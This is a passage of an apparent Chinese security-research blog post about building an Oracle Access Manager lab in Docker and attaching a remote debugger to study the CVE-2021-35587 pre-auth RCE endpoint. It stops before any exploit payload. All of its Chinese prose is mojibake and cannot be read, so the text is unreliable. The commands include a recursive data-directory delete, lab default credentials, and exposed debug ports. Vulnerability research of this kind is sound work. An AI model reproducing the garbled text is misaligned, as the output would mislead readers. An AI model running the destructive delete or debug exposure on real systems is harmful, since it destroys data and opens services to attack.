</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220319003016738.png alt=image-20220319003016738></p><table><thead><tr><th><strong>Console or Page</strong></th><th><strong>URL</strong></th></tr></thead><tbody><tr><td>WebLogic Administration Console</td><td><code>http://&lt;oamadmin_ip>:7001/console</code></td></tr><tr><td>Oracle Enterprise Manager Console</td><td><code>http://&lt;oamadmin_ip>:7001/em</code></td></tr><tr><td>Oracle Access Management Console</td><td><code>http://&lt;oamadmin_ip>:7001/oamconsole</code></td></tr><tr><td>OAM Server Logout</td><td><code>http://&lt;oamms_ip>:14100/oam/server/logout</code></td></tr><tr><td>Policy Manager Access</td><td><code>http://&lt;oampolicy_ip>:15100/access</code></td></tr></tbody></table><p>å„æœåŠ¡æˆªå›¾</p><p><img loading=lazy src=image-20220319004128564.png alt=image-20220319004128564></p><p><img loading=lazy src=image-20220319004142916.png alt=image-20220319004142916></p><p><img loading=lazy src=image-20220319004039342.png alt=image-20220319004039342></p><p><img loading=lazy src=image-20220319004207596.png alt=image-20220319004207596></p><p><img loading=lazy src=image-20220319004232583.png alt=image-20220319004232583></p><p><img loading=lazy src=image-20220319004241815.png alt=image-20220319004241815></p><h2 id=å¯åœä¸åˆ é™¤>â‘¦å¯åœä¸åˆ é™¤<a hidden class=anchor aria-hidden=true href=#å¯åœä¸åˆ é™¤>#</a></h2><p>å¯åœ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-39-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-39-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker stop oamadmin oamms oampolicy myOracleDB
</span></span><span style=display:flex><span>sudo docker start oamadmin oamms oampolicy myOracleDB
</span></span></code></pre></td></tr></table></div></div><p>åˆ é™¤</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-40-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-40-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>sudo docker stop oamadmin oamms oampolicy myOracleDB
</span></span><span style=display:flex><span>sudo docker rm oamadmin oamms oampolicy myOracleDB
</span></span><span style=display:flex><span>sudo rm -rf /scratch/user_projects
</span></span></code></pre></td></tr></table></div></div><h1 id=è¿œç¨‹è°ƒè¯•oam>è¿œç¨‹è°ƒè¯•OAM<a hidden class=anchor aria-hidden=true href=#è¿œç¨‹è°ƒè¯•oam>#</a></h1><p>æœ¬ç« èŠ‚æè¿°äº†æ‹¥æœ‰ä¸€ä¸ªæœ¬åœ°è¿è¡Œçš„OAMä¹‹åå¼€å¯è¿œç¨‹è°ƒè¯•ï¼Œä»¥åŠä»ä»…çŸ¥é“æ¼æ´æ¥å£ï¼Œåˆ°å®šä½æ¼æ´ä¸»æœº/å®¹å™¨ã€å®šä½æ¼æ´è¿›ç¨‹ã€å®šä½æ¼æ´ä»£ç ã€å†åˆ°ä¸‹è½½éƒ¨ç½²åŒ…å’Œæ­å»ºè°ƒè¯•é¡¹ç›®ï¼Œåˆ°æœ€ç»ˆèƒ½å¤Ÿé¡ºåˆ©è¿›è¡Œæ— æºç è¿œç¨‹è°ƒè¯•çš„è¯¦ç»†è¿‡ç¨‹ã€‚å…¶ä¸­ä¹Ÿä½“ç°äº†Java webè¿œç¨‹è°ƒè¯•çš„åŸºæœ¬æµç¨‹å’Œæ€è·¯ã€‚</p><h2 id=å¤§çº²-1>å¤§çº²<a hidden class=anchor aria-hidden=true href=#å¤§çº²-1>#</a></h2><p>OAMåŒ…æ‹¬å¤šä¸ªå®¹å™¨ï¼Œæˆ‘ä»¬éœ€è¦å…ˆå®šä½å‡ºæ¥åˆ†æè¿™ä¸ªæ¼æ´æ‰€éœ€è¦å…³æ³¨çš„å®¹å™¨å’Œè¿›ç¨‹ï¼Œä»¥è°ƒè¯•æ¨¡å¼é‡å¯è¯¥è¿›ç¨‹ï¼Œå°†è°ƒè¯•ç«¯å£ä»å®¹å™¨ä¸­æš´éœ²ç»™ç”¨äºè°ƒè¯•çš„ä¸»æœºï¼Œç„¶åå°†å¯¹åº”è¿›ç¨‹çš„éƒ¨ç½²åŒ…å’Œä¾èµ–åŒ…ä¸‹è½½åˆ°è°ƒè¯•ä¸»æœºï¼Œæœ€åé€šè¿‡ideaè¿›è¡Œå¸¸è§„çš„Java webè¿œç¨‹æ— æºç åŠ¨æ€è°ƒè¯•ã€‚</p><h2 id=æ­¥éª¤æ±‡æ€»-1>æ­¥éª¤æ±‡æ€»<a hidden class=anchor aria-hidden=true href=#æ­¥éª¤æ±‡æ€»-1>#</a></h2><ol><li>å‚ç…§ â€é™„å½•ä¸€ï¼šæœ¬åœ°æ­å»ºOAMè¿è¡Œç¯å¢ƒâ€œ çš„ â€æ­¥éª¤æ±‡æ€»â€œ ç« èŠ‚ï¼Œä½†åœ¨ â€æ­¥éª¤æ±‡æ€»â€œ ç« èŠ‚ä¸­çš„ç¬¬7æ­¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ–°å»ºå®¹å™¨ï¼Œåœ¨åŸå‘½ä»¤åŸºç¡€ä¸Šå¢åŠ æš´éœ²å‡ºæ¥å®¹å™¨çš„è°ƒè¯•ç«¯å£ã€‚</li></ol><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-41-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-41-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker run -d -it --name myOracleDB -p 8451:8453 -p 1521:1521 store/oracle/database-enterprise:12.2.0.1
</span></span><span style=display:flex><span>docker run -d --network<span style=color:#f92672>=</span>OamNET -p 8452:8453 -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span><span style=display:flex><span>docker run -d -p 14100:14100 -p 8453:8453 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>14100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_server1 --env MS_HOST<span style=color:#f92672>=</span>oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span><span style=display:flex><span>docker run -d -p 15100:15100 -p 8454:8453 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>15100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_policy_mgr1 --env MS_HOST<span style=color:#f92672>=</span>oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span></code></pre></td></tr></table></div></div><ol start=2><li>ä¿®æ”¹oammså®¹å™¨ä¸­çš„<code>/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh</code> æ–‡ä»¶ï¼Œåœ¨debugFlagå˜é‡è¢«ä½¿ç”¨ä¹‹å‰å°†å…¶èµ‹å€¼ä¸ºtrueã€‚å¤§çº¦æ˜¯åœ¨ç¬¬419è¡Œè¿™ä¸ªç©ºç™½è¡Œæ·»åŠ  <code>debugFlag="true"</code> ã€‚</li><li>é‡å¯oammså®¹å™¨ï¼š <code>docker restart oamms</code></li><li>å°†oammså®¹å™¨ä¸­çš„ <code>/u01/oracle/user_projects/domains/access_domain/servers/oam_server1/tmp/_WL_user/oam-jars/gkvqum/APP-INF/lib/*.jar</code> å’Œ <code>/u01/oracle/coherence/lib/*.jar</code> ä¸‹è½½åˆ°è°ƒè¯•ä¸»æœºï¼Œæ·»åŠ åˆ°è°ƒè¯•é¡¹ç›®çš„libraryä¸­ã€‚</li><li>åœ¨oammså®¹å™¨ä¸­ç”Ÿæˆ wlfullclient.jar ï¼Œä¸‹è½½åˆ°è°ƒè¯•ä¸»æœºï¼Œæ·»åŠ åˆ°è°ƒè¯•é¡¹ç›®çš„libraryä¸­ã€‚</li><li>é€šè¿‡ <code>docker exec oamms tail -f /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log</code> æŸ¥çœ‹é”™è¯¯æ—¥å¿—
ideaå¯åŠ¨è°ƒè¯•
åœ¨ <code>oracle.security.am.pbl.transport.http.AMServlet#doPost</code> ä¸‹æ–­ç‚¹
é€šè¿‡ <code>curl -XPOST http://192.168.175.139:14100/oam/server/opensso/sessionservice</code> å‘é€è¯·æ±‚
è¿™ä¸ªæ—¶å€™ideaå°±èƒ½æˆåŠŸæ•è·åˆ°æ–­ç‚¹äº†ã€‚</li></ol><h2 id=éœ€è¦å…³æ³¨çš„å®¹å™¨å’Œè¿›ç¨‹>â‘ éœ€è¦å…³æ³¨çš„å®¹å™¨å’Œè¿›ç¨‹<a hidden class=anchor aria-hidden=true href=#éœ€è¦å…³æ³¨çš„å®¹å™¨å’Œè¿›ç¨‹>#</a></h2><p>ç”±æ¼æ´ä½œè€…<a href=https://testbnull.medium.com/oracle-access-manager-pre-auth-rce-cve-2021-35587-analysis-1302a4542316>åˆ†ææ–‡ç« </a>çŸ¥é“å­˜åœ¨æ¼æ´çš„æ¥å£ä¸º <code>/oam/server/opensso/sessionservice</code> ï¼Œç»“åˆOAMæ­å»ºæ–‡æ¡£çš„<a href=https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#ValidatingtheOAMServices>æœåŠ¡éªŒè¯ç¯èŠ‚</a>ï¼ŒçŸ¥é“æ˜¯oammså®¹å™¨exposeçš„14100ç«¯å£ä¸Šwebåº”ç”¨çš„é—®é¢˜ï¼Œæ•…å°è¯•è°ƒè¯•è¯¥å®¹å™¨çš„webåº”ç”¨ã€‚</p><p>ä¿®æ”¹oammså®¹å™¨ä¸­çš„<code>/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh</code> æ–‡ä»¶ä»¥å°†oammsä¸­Javaè¿›ç¨‹åˆ‡æ¢åˆ°å¯è°ƒè¯•æ¨¡å¼ã€‚æ–¹ä¾¿æˆ‘ä»¬é€šè¿‡ideaæŒ‚è½½åˆ°oammsä¸­å¯¹å­˜åœ¨æ¼æ´çš„Javaè¿›ç¨‹è¿›è¡Œè¿œç¨‹è°ƒè¯•ã€‚</p><p>åœ¨ç©ºç™½è¡Œ419è¡Œæ·»åŠ <code>debugFlag="true"</code> ã€‚å®¹å™¨ä¸­æ²¡æœ‰vim , ps , netstat ç­‰å·¥å…·ï¼Œå¯ä»¥ä½¿ç”¨ <code>yum install vim net-tools</code> è¿›è¡Œå®‰è£…ã€‚</p><p><img loading=lazy src=image-20220322162630044.png alt=image-20220322162630044></p><p>ç„¶åæ‰§è¡Œ<code>docker restart oamms</code>ï¼Œé‡å¯å®Œæˆåè¿›å…¥å®¹å™¨å¯ä»¥çœ‹åˆ°è¿›ç¨‹å·²ç»ä»¥è°ƒè¯•æ¨¡å¼å¯åŠ¨ï¼Œå¹¶ä¸”ç›‘å¬åœ¨8453ç«¯å£ã€‚</p><p><img loading=lazy src=image-20220322163027854.png alt=image-20220322163027854></p><p>ä½†æ˜¯<strong>æ­¤æ—¶oammså®¹å™¨ä¸­çš„8453ç«¯å£å¹¶æ²¡æœ‰exposeå‡ºæ¥</strong>ã€‚</p><p>å°è¯•é€šè¿‡å°†å½“å‰oammså®¹å™¨ä¿å­˜ä¸ºé•œåƒï¼Œå†é‡æ–°å¯åŠ¨çš„æ–¹å¼æ¥æ·»åŠ æ˜ å°„ç«¯å£ï¼š</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-42-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-42-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker stop oamms
</span></span><span style=display:flex><span>docker commit oamms myoamms-image
</span></span><span style=display:flex><span>docker container rm oamms 
</span></span><span style=display:flex><span>docker run -itd -name oamms -p 8453:8453 -p 14100:14100 myoamms-image
</span></span><span style=display:flex><span>docker run -itd -n oamms -p 8453:8453 -p 14100:14100 myoamms-image
</span></span><span style=display:flex><span>docker run -itd --name oamms -p 8453:8453 -p 14100:14100 myoamms-image
</span></span></code></pre></td></tr></table></div></div><p>ä½†ä¼¼ä¹æ²¡æœ‰æˆåŠŸï¼Œç•Œé¢ä¸€ç›´åœç•™åœ¨ <code>Waiting for WebLogic Admin Server on oamadmin/7001 to become available...</code> ï¼Œå¯èƒ½æ˜¯æ–°å»ºçš„å®¹å™¨IPå˜åŠ¨å¯¼è‡´çš„ç½‘ç»œé€šä¿¡çš„é—®é¢˜ã€‚</p><p><img loading=lazy src=image-20220322170915415.png alt=image-20220322170915415></p><p>å¹²è„†é‡æ–°éƒ¨ç½²ï¼Œåœ¨æ–°å»ºå„ä¸ªå®¹å™¨çš„æ—¶å€™æ·»åŠ æ˜ å°„ç«¯å£ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-43-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-43-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker run -d -it --name myOracleDB -p 8451:8453 -p 1521:1521 store/oracle/database-enterprise:12.2.0.1
</span></span><span style=display:flex><span>docker run -d --network<span style=color:#f92672>=</span>OamNET -p 8452:8453 -p 7001:7001 --name<span style=color:#f92672>=</span>oamadmin --env CONNECTION_STRING<span style=color:#f92672>=</span>172.17.0.1:1521/ORCLPDB1.localdomain --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env RCUPREFIX<span style=color:#f92672>=</span>OAM1 --env DB_USER<span style=color:#f92672>=</span>sys --env DB_PASSWORD<span style=color:#f92672>=</span>Oradoc_db1 --env DB_SCHEMA_PASSWORD<span style=color:#f92672>=</span>Oradoc_db2 -v /scratch/user_projects/:/u01/oracle/user_projects container-registry.oracle.com/middleware/oam:12.2.1.4.0
</span></span><span style=display:flex><span>docker run -d -p 14100:14100 -p 8453:8453 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oamms --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>14100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_server1 --env MS_HOST<span style=color:#f92672>=</span>oamms container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span><span style=display:flex><span>docker run -d -p 15100:15100 -p 8454:8453 --network<span style=color:#f92672>=</span>OamNET --volumes-from oamadmin --name oampolicy --env DOMAIN_NAME<span style=color:#f92672>=</span>access_domain --env ADMIN_USER<span style=color:#f92672>=</span>weblogic --env ADMIN_PASSWORD<span style=color:#f92672>=</span>W3bl@gic --env ADMIN_LISTEN_HOST<span style=color:#f92672>=</span>oamadmin --env ADMIN_LISTEN_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>7001</span> --env MANAGEDSERVER_PORT<span style=color:#f92672>=</span><span style=color:#ae81ff>15100</span> --env MANAGED_SERVER_CONTAINER<span style=color:#f92672>=</span>true --env MS_NAME<span style=color:#f92672>=</span>oam_policy_mgr1 --env MS_HOST<span style=color:#f92672>=</span>oampolicy container-registry.oracle.com/middleware/oam:12.2.1.4.0 <span style=color:#e6db74>&#34;/u01/oracle/dockertools/startMS.sh&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>é‡æ–°éƒ¨ç½²åæŒ‰ç…§ä¸Šè¿°ä¿®æ”¹<code>/u01/oracle/user_projects/domains/access_domain/bin/setDomainEnv.sh</code> åé‡å¯oammså®¹å™¨ï¼Œå°†oammsæ”¹æˆè°ƒè¯•æ¨¡å¼å¯åŠ¨ã€‚</p><h2 id=ç›‘æ§webåº”ç”¨æ—¥å¿—>â‘¡ç›‘æ§webåº”ç”¨æ—¥å¿—<a hidden class=anchor aria-hidden=true href=#ç›‘æ§webåº”ç”¨æ—¥å¿—>#</a></h2><p>ä»<code>docker logs -f oamms</code> å¯ä»¥çœ‹åˆ°oammsçš„webåº”ç”¨æ—¥å¿—åœ¨<code>/u01/oracle/user_projects/domains/access_domain/logs/</code>è¿™ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œè®¿é—®åº”ç”¨æ—¶æœ€æ–°å‡ºç°æ”¹å˜çš„æ–‡ä»¶æ˜¯<code>oam_server1-ms-oamms.log</code>ã€‚</p><p>å› æ­¤æ‰§è¡Œ</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-44-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-44-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>docker exec oamms tail -f  /u01/oracle/user_projects/domains/access_domain/logs/oam_server1-ms-oamms.log
</span></span></code></pre></td></tr></table></div></div><h2 id=å‘æ¼æ´æ¥å£å‘é€åŸºæœ¬è¯·æ±‚>â‘¢å‘æ¼æ´æ¥å£å‘é€åŸºæœ¬è¯·æ±‚<a hidden class=anchor aria-hidden=true href=#å‘æ¼æ´æ¥å£å‘é€åŸºæœ¬è¯·æ±‚>#</a></h2><p>å‚è€ƒæ¼æ´ä½œè€…<a href=https://testbnull.medium.com/oracle-access-manager-pre-auth-rce-cve-2021-35587-analysis-1302a4542316>åˆ†ææ–‡ç« </a> ï¼Œå‘OAMMSå‘é€ä¸€ä¸ª <code>/oam/server/opensso/sessionservice</code> æ‰€èƒ½æ¥å—å’Œå¤„ç†çš„åŸºæœ¬è¯·æ±‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-45-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-45-16>16</a>
